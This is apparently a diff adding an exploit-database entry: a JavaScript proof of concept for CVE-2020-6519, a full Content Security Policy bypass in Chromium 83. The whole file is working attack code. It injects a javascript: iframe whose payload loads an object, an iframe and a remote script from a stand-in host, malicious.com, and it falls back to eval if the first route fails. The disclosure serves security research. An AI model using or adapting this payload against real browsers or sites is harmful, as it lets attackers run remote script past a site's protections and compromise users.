@@ -1,0 +1,34 @@
+#Title: Chromium 83 - Full CSP Bypass
+#Date: 02/09/2020
+#Exploit Author: Gal Weizman
+#Vendor Homepage: https://www.chromium.org/ 
+#Software Link: https://download-chromium.appspot.com/
+#Version: 83
+#Tested On: Mac OS, Windows, iPhone, Android
+#CVE: CVE-2020-6519
+
+(function(){
+
+		var payload = `
+			top.SUCCESS = true;
+			var o = document.createElement("object");
+			o.data = \`http://malicious.com/bypass-object-src.html\`;
+			document.body.appendChild(o);
+			var i = document.createElement("iframe");
+			i.src = \`http://malicious.com/bypass-child-src.html\`;
+			document.body.appendChild(i);
+			var s = document.createElement("script");
+			s.src = \`http://malicious.com/bypass-script-src.js\`;
+			document.body.appendChild(s);
+		`;
+
+		document.body.innerHTML+="<iframe id='XXX' src='javascript:" + payload +"'></iframe>";
+		setTimeout(() => {
+				if (!top.SUCCESS) {
+						XXX.contentWindow.eval(payload);
+				}
+		});
+
+}())
+
+// further information: https://github.com/weizman/CVE-2020-6519
